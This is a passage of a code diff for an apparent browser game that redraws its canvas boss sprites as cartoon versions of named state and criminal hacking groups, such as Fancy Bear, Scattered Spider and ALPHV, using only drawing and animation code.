-      CX.fillStyle='#804000'; CX.fillRect(-46,-19,92,38);
-      CX.fillStyle='#f0c8a0'; CX.beginPath(); CX.ellipse(0,6,29,21,0,0,TAU); CX.fill();
-      CX.fillStyle='#000'; CX.beginPath(); CX.arc(-11,4,4,0,TAU); CX.fill(); CX.beginPath(); CX.arc(11,4,4,0,TAU); CX.fill();
-      CX.fillStyle='#fff'; CX.beginPath(); CX.arc(-11,4,2,0,TAU); CX.fill(); CX.beginPath(); CX.arc(11,4,2,0,TAU); CX.fill();
-      CX.fillStyle='#ff8d39'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('SVR/APT29',0,-10);
-      CX.strokeStyle='rgba(255,141,57,0.32)'; CX.lineWidth=1.5; CX.setLineDash([4,4]);
-      CX.beginPath(); CX.ellipse(0,0,BOSS.w/2+12,BOSS.h/2+9,0,0,TAU); CX.stroke(); CX.setLineDash([]); break;
-
-    case 'SCATTERED SPIDER':
-      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,0,40,28,0,0,TAU); CX.fill();
-      CX.strokeStyle=c; CX.lineWidth=3.8;
-      [-70,-50,-30,-10,10,30,50,70].forEach(la=>{ const ar=la*(Math.PI/180); CX.beginPath(); CX.moveTo(Math.cos(ar)*38,Math.sin(ar)*24); CX.quadraticCurveTo(Math.cos(ar)*60+rnd(-4,4),Math.sin(ar)*46,Math.cos(ar)*64,Math.sin(ar)*54+BOSS.phase*12); CX.stroke(); });
-      CX.fillStyle='#ffc8ff';
-      for(let i=-3;i<=3;i+=1.5){ CX.beginPath(); CX.arc(i*7,-5,2.8,0,TAU); CX.fill(); }
-      CX.fillStyle='rgba(0,0,0,0.72)'; CX.fillRect(-24,-11,48,23);
-      CX.fillStyle='#ff62ff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('IT SUPPORT',0,5); break;
-
-    case 'WICKED PANDA':
-      CX.fillStyle=c; CX.fillRect(-65,-31,130,62); CX.fillRect(-71,-41,25,23); CX.fillRect(46,-41,25,23);
-      CX.fillStyle='#2a5000'; CX.fillRect(-49,-21,98,42);
-      CX.fillStyle='#000'; CX.beginPath(); CX.ellipse(-21,4,16,13,0,0,TAU); CX.fill(); CX.beginPath(); CX.ellipse(21,4,16,13,0,0,TAU); CX.fill();
-      CX.fillStyle='#fff'; CX.beginPath(); CX.arc(-21,4,9,0,TAU); CX.fill(); CX.beginPath(); CX.arc(21,4,9,0,TAU); CX.fill();
-      CX.fillStyle='#000'; CX.beginPath(); CX.arc(-21,4,4,0,TAU); CX.fill(); CX.beginPath(); CX.arc(21,4,4,0,TAU); CX.fill();
-      CX.fillStyle='#88ff55'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('APT41/MSS',0,-10);
-      CX.strokeStyle='rgba(136,255,85,0.36)'; CX.lineWidth=2; CX.strokeRect(-32,-27,64,54); break;
-
-    case 'LABYRINTH CHOLLIMA':
-      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,8,47,25,0,0,TAU); CX.fill();
-      CX.fillStyle='#1a3878';
-      CX.beginPath(); CX.moveTo(-39,8); CX.quadraticCurveTo(-72,-29,-84,-21); CX.lineTo(-60,23); CX.closePath(); CX.fill();
-      CX.beginPath(); CX.moveTo(39,8);  CX.quadraticCurveTo(72,-29,84,-21);   CX.lineTo(60,23);  CX.closePath(); CX.fill();
-      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,-4,19,23,0,0,TAU); CX.fill();
-      CX.fillStyle='rgba(0,0,0,0.72)'; CX.fillRect(-30,6,60,17);
-      CX.fillStyle='#4ab6ff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('DPRK/IT',0,18); break;
-
-    case 'CARBON SPIDER':
-      CX.fillStyle=c; CX.fillRect(-72,-23,144,46); CX.fillRect(-56,-39,112,17);
-      CX.strokeStyle='#ffd84d'; CX.lineWidth=3; CX.strokeRect(-21,-13,42,27);
-      CX.strokeStyle=c; CX.lineWidth=3.5;
-      for(let s=-1;s<=1;s+=2) for(let j=0;j<3;j++){ CX.beginPath(); CX.moveTo(s*44,-23+j*15); CX.lineTo(s*(62+j*9),-35+j*19); CX.stroke(); }
-      CX.fillStyle='#ffd84d'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('ALPHV/RaaS',0,5); break;
-
-    case 'FAMOUS CHOLLIMA':
-      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,10,49,27,0,0,TAU); CX.fill();
-      CX.fillStyle='#064840';
-      CX.beginPath(); CX.moveTo(-41,10); CX.quadraticCurveTo(-82,-25,-88,-17); CX.lineTo(-64,25); CX.closePath(); CX.fill();
-      CX.beginPath(); CX.moveTo(41,10);  CX.quadraticCurveTo(82,-25,88,-17);   CX.lineTo(64,25);  CX.closePath(); CX.fill();
-      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,-4,21,25,0,0,TAU); CX.fill();
-      CX.fillStyle='rgba(0,0,0,0.72)'; CX.fillRect(-32,10,64,19);
-      CX.fillStyle='#2af0d0'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('₿ DPRK',0,23); break;
-
-    case 'VOODOO BEAR':
-      CX.fillStyle=c; CX.beginPath();
-      for(let i=0;i<6;i++){ const ao=i/6*TAU-Math.PI/2,ai=(i+0.5)/6*TAU-Math.PI/2; if(i===0) CX.moveTo(Math.cos(ao)*56,Math.sin(ao)*44); CX.lineTo(Math.cos(ao)*56,Math.sin(ao)*44); CX.lineTo(Math.cos(ai)*25,Math.sin(ai)*21); }
-      CX.closePath(); CX.fill();
-      CX.fillStyle='rgba(200,80,255,0.32)'; CX.fill();
-      CX.strokeStyle='#e090ff'; CX.lineWidth=2.2; CX.stroke();
-      CX.fillStyle='#fff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('SANDWORM',0,4);
-      CX.strokeStyle='rgba(200,80,255,0.5)'; CX.lineWidth=1.5;
-      CX.beginPath(); CX.moveTo(-52,-32); CX.lineTo(52,32); CX.moveTo(52,-32); CX.lineTo(-52,32); CX.stroke(); break;
-
-    case 'STAR KITTEN':
-      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,5,52,31,0,0,TAU); CX.fill();
+    case 'FANCY BEAR': {
+      // GRU/APT28 — Russian military cyberspace bear: radar eyes, GRU star, antenna arrays
+      // Body: rounded bear head silhouette
       CX.fillStyle=c;
-      CX.beginPath(); CX.moveTo(-32,-27); CX.lineTo(-46,-50); CX.lineTo(-15,-27); CX.closePath(); CX.fill();
-      CX.beginPath(); CX.moveTo(32,-27);  CX.lineTo(46,-50);  CX.lineTo(15,-27);  CX.closePath(); CX.fill();
-      CX.fillStyle='#442200'; CX.fillRect(-36,-17,72,27);
-      CX.strokeStyle='rgba(255,200,100,0.58)'; CX.lineWidth=1.5;
-      CX.beginPath(); CX.moveTo(-8,4); CX.lineTo(-50,-2); CX.moveTo(-8,8); CX.lineTo(-46,13); CX.moveTo(8,4); CX.lineTo(50,-2); CX.moveTo(8,8); CX.lineTo(46,13); CX.stroke();
-      CX.fillStyle='#ffaa00'; CX.beginPath(); CX.ellipse(-17,2,8,6,0,0,TAU); CX.fill(); CX.beginPath(); CX.ellipse(17,2,8,6,0,0,TAU); CX.fill();
-      CX.fillStyle='#000'; CX.fillRect(-18,-2,2,8); CX.fillRect(15,-2,2,8);
-      CX.fillStyle='#ffaa00'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('IRGC/APT35',0,-8); break;
-
-    case 'ECLIPSE SPIDER':
-      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,0,54,36,0,0,TAU); CX.fill();
-      CX.strokeStyle=c; CX.lineWidth=4.2;
-      for(let i=0;i<10;i++){ const a=(i/10*TAU)-Math.PI/2; CX.beginPath(); CX.moveTo(Math.cos(a)*54,Math.sin(a)*34); CX.quadraticCurveTo(Math.cos(a)*76+rnd(-8,8),Math.sin(a)*50+rnd(-8,8),Math.cos(a)*92,Math.sin(a)*60+BOSS.phase*18); CX.stroke(); }
-      CX.fillStyle='rgba(255,144,96,0.38)'; CX.beginPath(); CX.ellipse(0,0,34,24,0,0,TAU); CX.fill();
-      CX.fillStyle='#fff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('MOVEit/CLOP',0,4);
-      { const scanA=BOSS.t*1.22; CX.strokeStyle='rgba(255,144,96,0.22)'; CX.lineWidth=1.5; CX.beginPath(); CX.moveTo(0,0); CX.lineTo(Math.cos(scanA)*210,Math.sin(scanA)*145); CX.stroke(); CX.beginPath(); CX.moveTo(0,0); CX.lineTo(Math.cos(scanA+Math.PI)*210,Math.sin(scanA+Math.PI)*145); CX.stroke(); }
+      CX.beginPath(); CX.ellipse(0,6,58,28,0,0,TAU); CX.fill();
+      // Ear humps (top-left, top-right)
+      CX.beginPath(); CX.ellipse(-42,-18,16,13,0,0,TAU); CX.fill();
+      CX.beginPath(); CX.ellipse(42,-18,16,13,0,0,TAU); CX.fill();
+      // Inner ear (darker)
+      CX.fillStyle='#7a1010';
+      CX.beginPath(); CX.ellipse(-42,-18,9,7,0,0,TAU); CX.fill();
+      CX.beginPath(); CX.ellipse(42,-18,9,7,0,0,TAU); CX.fill();
+      // Face panel
+      CX.fillStyle='#5a0c0c';
+      CX.beginPath(); CX.ellipse(0,8,44,22,0,0,TAU); CX.fill();
+      // GRU 5-pointed star badge (gold, center)
+      CX.fillStyle=BOSS.hf>0?'#fff':'#ffd84d';
+      CX.shadowBlur=BOSS.hf>0?0:10; CX.shadowColor='#ffd84d';
+      CX.beginPath();
+      for(let si=0;si<5;si++){
+        const ao=si/5*TAU-Math.PI/2, ai=ao+Math.PI/5;
+        si===0?CX.moveTo(Math.cos(ao)*13,Math.sin(ao)*13+6):CX.lineTo(Math.cos(ao)*13,Math.sin(ao)*13+6);
+        CX.lineTo(Math.cos(ai)*5.5,Math.sin(ai)*5.5+6);
+      }
+      CX.closePath(); CX.fill(); CX.shadowBlur=0;
+      // Radar eyes — two concentric rings with sweeping line (BOSS.t)
+      for(const ex of [-22,22]){
+        // White outer iris
+        CX.fillStyle='#fff'; CX.beginPath(); CX.arc(ex,3,11,0,TAU); CX.fill();
+        // Iris rings
+        CX.strokeStyle='rgba(220,40,40,0.7)'; CX.lineWidth=2;
+        CX.beginPath(); CX.arc(ex,3,8,0,TAU); CX.stroke();
+        CX.strokeStyle='rgba(255,80,80,0.45)'; CX.lineWidth=1;
+        CX.beginPath(); CX.arc(ex,3,5,0,TAU); CX.stroke();
+        // Radar sweep line
+        const sweepA=BOSS.t*2.4+(ex>0?Math.PI:0);
+        CX.strokeStyle='rgba(255,60,60,0.85)'; CX.lineWidth=1.5;
+        CX.beginPath(); CX.moveTo(ex,3); CX.lineTo(ex+Math.cos(sweepA)*9,3+Math.sin(sweepA)*9); CX.stroke();
+        // Radar sweep arc trail
+        CX.strokeStyle='rgba(255,60,60,0.18)'; CX.lineWidth=6;
+        CX.beginPath(); CX.arc(ex,3,9,sweepA-0.9,sweepA); CX.stroke();
+        // Pupil
+        CX.fillStyle='#e03030'; CX.beginPath(); CX.arc(ex,3,3,0,TAU); CX.fill();
+      }
+      // Snout
+      CX.fillStyle='#8a1818';
+      CX.beginPath(); CX.ellipse(0,20,11,7,0,0,TAU); CX.fill();
+      CX.fillStyle='#5a0808';
+      CX.beginPath(); CX.ellipse(0,21,5,3,0,0,TAU); CX.fill();
+      // Three antenna arrays
+      CX.strokeStyle=c; CX.lineWidth=2.2;
+      CX.beginPath();
+      CX.moveTo(-22,-22); CX.lineTo(-22,-52);
+      CX.moveTo(0,-22);   CX.lineTo(0,-56);
+      CX.moveTo(22,-22);  CX.lineTo(22,-52);
+      CX.stroke();
+      // Antenna tips (dishes)
+      CX.strokeStyle='#ffd84d'; CX.lineWidth=1.5;
+      for(const ax of [-22,0,22]){
+        CX.beginPath(); CX.arc(ax,-52,4,Math.PI,TAU); CX.stroke();
+        CX.fillStyle='#ffd84d'; CX.beginPath(); CX.arc(ax,-52,1.5,0,TAU); CX.fill();
+      }
+      // Outer glow outline
+      CX.strokeStyle=c; CX.lineWidth=1.5;
+      CX.beginPath(); CX.ellipse(0,6,58,28,0,0,TAU); CX.stroke();
       break;
+    }
+
+    case 'COZY BEAR': {
+      // SVR/APT29 — Sophisticated intelligence bear: phishing hooks, stealth shimmer, elegant eyes
+      // Bear silhouette
+      CX.fillStyle=c;
+      CX.beginPath(); CX.ellipse(0,4,56,26,0,0,TAU); CX.fill();
+      // Ear humps
+      CX.beginPath(); CX.ellipse(-40,-17,14,11,0,0,TAU); CX.fill();
+      CX.beginPath(); CX.ellipse(40,-17,14,11,0,0,TAU); CX.fill();
+      // Inner ear
+      CX.fillStyle='#d06020';
+      CX.beginPath(); CX.ellipse(-40,-17,8,6,0,0,TAU); CX.fill();
+      CX.beginPath(); CX.ellipse(40,-17,8,6,0,0,TAU); CX.fill();
+      // Honey-amber body
+      CX.fillStyle='#804000';
+      CX.beginPath(); CX.ellipse(0,6,42,20,0,0,TAU); CX.fill();
+      // Face muzzle
+      CX.fillStyle='#c87840';
+      CX.beginPath(); CX.ellipse(0,14,22,12,0,0,TAU); CX.fill();
+      // Sophisticated eye (single multi-ring eye, centered)
+      CX.fillStyle='#fff';
+      CX.beginPath(); CX.ellipse(0,2,20,13,0,0,TAU); CX.fill();
+      CX.strokeStyle='rgba(255,141,57,0.5)'; CX.lineWidth=1.5;
+      CX.beginPath(); CX.ellipse(0,2,16,10,0,0,TAU); CX.stroke();
+      CX.beginPath(); CX.ellipse(0,2,11,7,0,0,TAU); CX.stroke();
+      CX.fillStyle='#000'; CX.beginPath(); CX.arc(0,2,6,0,TAU); CX.fill();
+      CX.fillStyle='#fff'; CX.beginPath(); CX.arc(-2,0,2,0,TAU); CX.fill();
+      // Phishing hooks dangling from sides (animated sway)
+      const swayA=Math.sin(BOSS.t*1.6)*0.3;
+      for(const sx of [-1,1]){
+        CX.save(); CX.translate(sx*56,4);
+        CX.rotate(sx*swayA);
+        CX.strokeStyle='rgba(255,141,57,0.75)'; CX.lineWidth=1.5;
+        // Hook line
+        CX.beginPath(); CX.moveTo(0,0); CX.lineTo(0,14); CX.stroke();
+        // Hook curve
+        CX.beginPath(); CX.arc(-sx*3,14,3,Math.PI/2,(sx>0?0:Math.PI)); CX.stroke();
+        // Hook barb
+        CX.beginPath(); CX.moveTo(-sx*6,14); CX.lineTo(-sx*6,11); CX.stroke();
+        // Phishing email lure (small envelope at hook)
+        CX.fillStyle='rgba(255,141,57,0.45)'; CX.fillRect(-5,-3,10,7);
+        CX.strokeStyle='rgba(255,141,57,0.55)'; CX.lineWidth=0.8;
+        CX.beginPath(); CX.moveTo(-5,-3); CX.lineTo(0,1); CX.lineTo(5,-3); CX.stroke();
+        CX.restore();
+      }
+      // Stealth shimmer ring (dashed, alpha pulsing)
+      CX.globalAlpha=0.28+0.14*Math.sin(BOSS.t*1.8);
+      CX.strokeStyle='#ff8d39'; CX.lineWidth=1.8; CX.setLineDash([5,5]);
+      CX.beginPath(); CX.ellipse(0,0,BOSS.w/2+14,BOSS.h/2+11,0,0,TAU); CX.stroke();
+      CX.setLineDash([]); CX.globalAlpha=1;
+      // Outline
+      CX.strokeStyle=c; CX.lineWidth=1.5;
+      CX.beginPath(); CX.ellipse(0,4,56,26,0,0,TAU); CX.stroke();
+      break;
+    }
+
+    case 'SCATTERED SPIDER': {
+      // 0ktapus/Scattered Spider — Chaotic teen-hacker IT support spider, SIM swap specialist
+      // 8 chaotic legs (trembling tips)
+      CX.strokeStyle=c; CX.lineWidth=3;
+      const legAngles=[-80,-55,-32,-12,12,32,55,80];
+      legAngles.forEach((la,li)=>{
+        const ar=la*(Math.PI/180);
+        const jit=Math.sin(BOSS.t*6+li*0.9)*5; // chaotic jitter
+        const mx=Math.cos(ar)*58+rnd(-3,3), my=Math.sin(ar)*44+jit;
+        CX.beginPath();
+        CX.moveTo(Math.cos(ar)*36,Math.sin(ar)*22);
+        CX.quadraticCurveTo(Math.cos(ar)*50,Math.sin(ar)*36+jit*0.5,mx,my);
+        CX.stroke();
+        // Claw tips
+        CX.fillStyle=c; CX.beginPath(); CX.arc(mx,my,3.5,0,TAU); CX.fill();
+      });
+      // Body
+      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,0,36,24,0,0,TAU); CX.fill();
+      // Fur highlights
+      CX.fillStyle='rgba(255,200,255,0.22)';
+      CX.beginPath(); CX.ellipse(0,-6,26,12,0,0,TAU); CX.fill();
+      // IT Headset: arc over top + mic arm
+      CX.strokeStyle='#ffc8ff'; CX.lineWidth=2.5;
+      CX.beginPath(); CX.arc(0,-8,20,Math.PI+0.3,-0.3); CX.stroke();
+      CX.fillStyle='#ffc8ff';
+      CX.beginPath(); CX.arc(-19,-8,5,0,TAU); CX.fill(); // left earpiece
+      CX.beginPath(); CX.arc(19,-8,5,0,TAU); CX.fill();  // right earpiece
+      // Mic boom
+      CX.strokeStyle='#ff62ff'; CX.lineWidth=1.5;
+      CX.beginPath(); CX.moveTo(19,-8); CX.quadraticCurveTo(24,2,20,8); CX.stroke();
+      CX.fillStyle='#ff62ff'; CX.beginPath(); CX.arc(20,8,3,0,TAU); CX.fill();
+      // SIM card (rectangular with notch)
+      CX.fillStyle='rgba(200,0,200,0.35)';
+      CX.fillRect(-18,6,24,14); CX.fillStyle='#1a001a'; CX.fillRect(-18,6,4,5);
+      CX.strokeStyle='#ff62ff'; CX.lineWidth=0.8; CX.strokeRect(-18,6,24,14);
+      // Chat bubble (social engineering)
+      CX.fillStyle='rgba(255,100,255,0.22)';
+      CX.beginPath(); CX.roundRect(8,-24,28,14,4); CX.fill();
+      CX.strokeStyle='rgba(255,100,255,0.55)'; CX.lineWidth=0.8; CX.stroke();
+      CX.beginPath(); CX.moveTo(10,-10); CX.lineTo(8,-6); CX.lineTo(14,-10); CX.closePath();
+      CX.fillStyle='rgba(255,100,255,0.22)'; CX.fill();
+      // Fangs (bottom of body)
+      CX.fillStyle='#fff';
+      CX.beginPath(); CX.moveTo(-6,22); CX.lineTo(-9,32); CX.lineTo(-3,22); CX.closePath(); CX.fill();
+      CX.beginPath(); CX.moveTo(6,22);  CX.lineTo(9,32);  CX.lineTo(3,22);  CX.closePath(); CX.fill();
+      // Label
+      CX.fillStyle='rgba(0,0,0,0.7)'; CX.fillRect(-24,-11,48,20);
+      CX.fillStyle=c; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('IT SUPPORT',0,2);
+      break;
+    }
+
+    case 'WICKED PANDA': {
+      // APT41/MSS — Chinese state panda with surveillance cameras + circuit dragon spine
+      // Main body (white panda body)
+      CX.fillStyle='#ddf0dd';
+      CX.beginPath(); CX.ellipse(0,4,54,27,0,0,TAU); CX.fill();
+      // Black ear patches (top)
+      CX.fillStyle='#111'; CX.beginPath(); CX.ellipse(-38,-18,16,13,0,0,TAU); CX.fill();
+      CX.beginPath(); CX.ellipse(38,-18,16,13,0,0,TAU); CX.fill();
+      // Black eye patches (APT41 signature panda markings)
+      CX.fillStyle='#111';
+      CX.beginPath(); CX.ellipse(-20,2,17,13,0,0,TAU); CX.fill();
+      CX.beginPath(); CX.ellipse(20,2,17,13,0,0,TAU); CX.fill();
+      // Camera lens eyes inside patches
+      CX.fillStyle='#223a00'; CX.beginPath(); CX.arc(-20,2,9,0,TAU); CX.fill();
+      CX.beginPath(); CX.arc(20,2,9,0,TAU); CX.fill();
+      // Camera lens iris rings
+      CX.strokeStyle=c; CX.lineWidth=1.5;
+      CX.beginPath(); CX.arc(-20,2,7,0,TAU); CX.stroke();
+      CX.beginPath(); CX.arc(20,2,7,0,TAU); CX.stroke();
+      CX.strokeStyle='rgba(136,255,85,0.5)'; CX.lineWidth=0.8;
+      CX.beginPath(); CX.arc(-20,2,4.5,0,TAU); CX.stroke();
+      CX.beginPath(); CX.arc(20,2,4.5,0,TAU); CX.stroke();
+      // Camera pupil (crosshair)
+      CX.strokeStyle='#88ff55'; CX.lineWidth=0.8;
+      for(const ex of [-20,20]){
+        CX.beginPath(); CX.moveTo(ex-3,2); CX.lineTo(ex+3,2); CX.stroke();
+        CX.beginPath(); CX.moveTo(ex,2-3); CX.lineTo(ex,2+3); CX.stroke();
+      }
+      // Snout
+      CX.fillStyle='#c8e0c8';
+      CX.beginPath(); CX.ellipse(0,16,14,9,0,0,TAU); CX.fill();
+      CX.fillStyle='#111'; CX.beginPath(); CX.ellipse(0,16,5,3,0,0,TAU); CX.fill();
+      // Surveillance camera arms (panning via BOSS.t)
+      const camAngle=Math.sin(BOSS.t*0.7)*0.24;
+      for(const sx of [-1,1]){
+        CX.save(); CX.translate(sx*54,4); CX.rotate(sx*camAngle);
+        // Arm
+        CX.strokeStyle='#88ff55'; CX.lineWidth=2.5;
+        CX.beginPath(); CX.moveTo(0,0); CX.lineTo(sx*14,0); CX.stroke();
+        // Camera body
+        CX.fillStyle='#1a2800'; CX.fillRect(sx*14-7,-7,14,14);
+        CX.strokeStyle=c; CX.lineWidth=1; CX.strokeRect(sx*14-7,-7,14,14);
+        // Lens
+        CX.fillStyle='#223a00'; CX.beginPath(); CX.arc(sx*14+sx*4,0,5,0,TAU); CX.fill();
+        CX.strokeStyle=c; CX.lineWidth=1; CX.stroke();
+        CX.fillStyle='#88ff55'; CX.beginPath(); CX.arc(sx*14+sx*4,0,2.5,0,TAU); CX.fill();
+        // Record indicator
+        CX.fillStyle=`rgba(255,60,0,${0.6+0.4*Math.sin(BOSS.t*4)})`;
+        CX.beginPath(); CX.arc(sx*14-5,-5,2,0,TAU); CX.fill();
+        CX.restore();
+      }
+      // Dragon circuit spine (PCB trace down center body)
+      CX.strokeStyle='rgba(136,255,85,0.38)'; CX.lineWidth=1.2; CX.setLineDash([4,3]);
+      CX.beginPath(); CX.moveTo(0,-22); CX.lineTo(0,26); CX.stroke();
+      CX.setLineDash([]);
+      // Branch nodes
+      CX.fillStyle='rgba(136,255,85,0.55)';
+      for(const ny of [-14,-4,6,16]){
+        CX.beginPath(); CX.arc(0,ny,2.5,0,TAU); CX.fill();
+        // Horizontal branches
+        CX.strokeStyle='rgba(136,255,85,0.28)'; CX.lineWidth=0.8;
+        CX.beginPath(); CX.moveTo(-12,ny); CX.lineTo(12,ny); CX.stroke();
+      }
+      // MSS badge (circular)
+      CX.strokeStyle=c; CX.lineWidth=2;
+      CX.beginPath(); CX.ellipse(0,0,54,27,0,0,TAU); CX.stroke();
+      break;
+    }
+
+    case 'LABYRINTH CHOLLIMA': {
+      // Lazarus Group/DPRK — Flying horse (Chollima) with crypto symbols + wide wings
+      const wingFlap=Math.sin(BOSS.t*2.2)*0.15;
+      // Wing left (animated)
+      CX.fillStyle='#1a3878';
+      CX.beginPath();
+      CX.moveTo(-38,8);
+      CX.quadraticCurveTo(-72+wingFlap*20,-26-wingFlap*30,-84,-20+wingFlap*18);
+      CX.lineTo(-62,24); CX.closePath(); CX.fill();
+      CX.strokeStyle=c; CX.lineWidth=1; CX.stroke();
+      // Wing right (animated, mirrored)
+      CX.fillStyle='#1a3878';
+      CX.beginPath();
+      CX.moveTo(38,8);
+      CX.quadraticCurveTo(72-wingFlap*20,-26-wingFlap*30,84,-20+wingFlap*18);
+      CX.lineTo(62,24); CX.closePath(); CX.fill();
+      CX.strokeStyle=c; CX.lineWidth=1; CX.stroke();
+      // Wing feather details
+      CX.strokeStyle='rgba(74,182,255,0.4)'; CX.lineWidth=0.8;
+      for(let wi=0;wi<3;wi++){
+        const wt=wi/3;
+        CX.beginPath(); CX.moveTo(-38+(-46)*wt,8+(-28)*wt); CX.lineTo(-44+(-28)*wt,18+(-36)*wt); CX.stroke();
+        CX.beginPath(); CX.moveTo(38+(46)*wt,8+(-28)*wt); CX.lineTo(44+(28)*wt,18+(-36)*wt); CX.stroke();
+      }
+      // Horse body
+      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,8,44,22,0,0,TAU); CX.fill();
+      // Horse head/neck
+      CX.fillStyle=c; CX.beginPath(); CX.ellipse(10,-10,16,20,0.3,0,TAU); CX.fill();
+      // Mane wisps
+      CX.strokeStyle='rgba(74,182,255,0.6)'; CX.lineWidth=1.2;
+      for(let mi=0;mi<4;mi++){
+        CX.beginPath(); CX.moveTo(-2+mi*4,-20); CX.quadraticCurveTo(-10+mi*3,-30,-8+mi*5,-26); CX.stroke();
+      }
+      // Bitcoin ₿ symbol (gold, center body)
+      CX.fillStyle=BOSS.hf>0?'#fff':'#ffd84d';
+      CX.font='bold 14px monospace'; CX.textAlign='center';
+      CX.fillText('₿',-4,14);
+      // ETH diamond orbiting
+      const ethA=BOSS.t*1.8;
+      const ethX=Math.cos(ethA)*42, ethY=8+Math.sin(ethA)*20;
+      CX.strokeStyle='rgba(74,182,255,0.8)'; CX.lineWidth=1.5;
+      CX.beginPath(); CX.moveTo(ethX,ethY-8); CX.lineTo(ethX+6,ethY); CX.lineTo(ethX,ethY+8); CX.lineTo(ethX-6,ethY); CX.closePath(); CX.stroke();
+      // Orbit trail
+      CX.strokeStyle='rgba(74,182,255,0.15)'; CX.lineWidth=1; CX.setLineDash([3,4]);
+      CX.beginPath(); CX.ellipse(0,8,42,20,0,0,TAU); CX.stroke(); CX.setLineDash([]);
+      // Hooves
+      CX.fillStyle='#0e2454';
+      for(const hx of [-24,-8,8,24]){
+        CX.beginPath(); CX.roundRect(hx-4,24,8,7,2); CX.fill();
+      }
+      break;
+    }
+
+    case 'CARBON SPIDER': {
+      // ALPHV/BlackCat RaaS — Heavy industrial ransomware spider with padlock center
+      // Upper deck
+      CX.fillStyle=c; CX.beginPath(); CX.roundRect(-56,-39,112,17,3); CX.fill();
+      // Main carapace body
+      CX.fillStyle=c; CX.beginPath(); CX.roundRect(-72,-23,144,46,4); CX.fill();
+      CX.strokeStyle='rgba(255,180,0,0.4)'; CX.lineWidth=1; CX.stroke();
+      // Center padlock icon (ALPHV/LOCKED motif)
+      // Shackle
+      const shackleOpen=BOSS.phase>=2&&((BOSS.t*3)%1>0.82);
+      CX.strokeStyle='#2a1800'; CX.lineWidth=4;
+      CX.beginPath();
+      if(shackleOpen){
+        CX.arc(0,-13,10,Math.PI,-0.1); // open gap
+      } else {
+        CX.arc(0,-13,10,Math.PI,0); // closed
+      }
+      CX.stroke();
+      // Shackle posts into lock body
+      CX.beginPath(); CX.moveTo(-10,-13); CX.lineTo(-10,-5); CX.stroke();
+      if(!shackleOpen){ CX.beginPath(); CX.moveTo(10,-13); CX.lineTo(10,-5); CX.stroke(); }
+      // Lock body
+      CX.fillStyle='#2a1800';
+      CX.beginPath(); CX.roundRect(-16,-5,32,26,3); CX.fill();
+      CX.strokeStyle='#ffd84d'; CX.lineWidth=1.5; CX.stroke();
+      // Keyhole
+      CX.fillStyle='#ffd84d'; CX.beginPath(); CX.arc(0,7,5,0,TAU); CX.fill();
+      CX.fillStyle='#2a1800'; CX.fillRect(-2.5,7,5,8);
+      // "LOCKED" inside lock body
+      CX.fillStyle='#8a0000'; CX.font='bold 6px monospace'; CX.textAlign='center';
+      CX.fillText('LOCKED',0,28);
+      // 6 mechanical legs (3 per side), angular joints
+      CX.strokeStyle=c; CX.lineWidth=3.5+BOSS.phase;
+      for(let s=-1;s<=1;s+=2){
+        for(let j=0;j<3;j++){
+          const startX=s*44, startY=-18+j*18;
+          const elbowX=s*(56+j*8), elbowY=-28+j*18;
+          const endX=s*(66+j*10), endY=-10+j*22;
+          CX.beginPath(); CX.moveTo(startX,startY); CX.lineTo(elbowX,elbowY); CX.lineTo(endX,endY); CX.stroke();
+          // Joint circle
+          CX.fillStyle='#ffd84d'; CX.beginPath(); CX.arc(elbowX,elbowY,4,0,TAU); CX.fill();
+          // Claw tip
+          CX.beginPath(); CX.arc(endX,endY,3.5,0,TAU); CX.fill();
+        }
+      }
+      // Rivets along carapace edge
+      CX.fillStyle='rgba(200,140,0,0.5)';
+      for(const rx of [-66,-50,-34,-18,0,18,34,50,66]){
+        CX.beginPath(); CX.arc(rx,-22,2,0,TAU); CX.fill();
+        CX.beginPath(); CX.arc(rx,22,2,0,TAU); CX.fill();
+      }
+      break;
+    }
+
+    case 'FAMOUS CHOLLIMA': {
+      // TraderTraitor/DPRK — Teal crypto-theft flying horse, Bitcoin/supply chain
+      const wingFlapF=Math.sin(BOSS.t*1.9)*0.18;
+      // Wings
+      CX.fillStyle='#064840';
+      CX.beginPath();
+      CX.moveTo(-41,10); CX.quadraticCurveTo(-80+wingFlapF*22,-22-wingFlapF*28,-88,-16+wingFlapF*16); CX.lineTo(-66,26); CX.closePath(); CX.fill();
+      CX.strokeStyle=c; CX.lineWidth=1; CX.stroke();
+      CX.beginPath();
+      CX.moveTo(41,10); CX.quadraticCurveTo(80-wingFlapF*22,-22-wingFlapF*28,88,-16+wingFlapF*16); CX.lineTo(66,26); CX.closePath(); CX.fill();
+      CX.strokeStyle=c; CX.lineWidth=1; CX.stroke();
+      // Wing feathers (teal accent)
+      CX.strokeStyle='rgba(42,240,208,0.38)'; CX.lineWidth=0.8;
+      for(let wi=0;wi<3;wi++){
+        const wt=wi/3;
+        CX.beginPath(); CX.moveTo(-41+(-40)*wt,10+(-25)*wt); CX.lineTo(-48+(-24)*wt,20+(-30)*wt); CX.stroke();
+        CX.beginPath(); CX.moveTo(41+(40)*wt,10+(-25)*wt); CX.lineTo(48+(24)*wt,20+(-30)*wt); CX.stroke();
+      }
+      // Body
+      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,10,46,24,0,0,TAU); CX.fill();
+      // Head
+      CX.fillStyle=c; CX.beginPath(); CX.ellipse(12,-8,15,19,0.25,0,TAU); CX.fill();
+      // ₿ large gold (supply chain theft motif)
+      CX.fillStyle=BOSS.hf>0?'#fff':'#ffd84d';
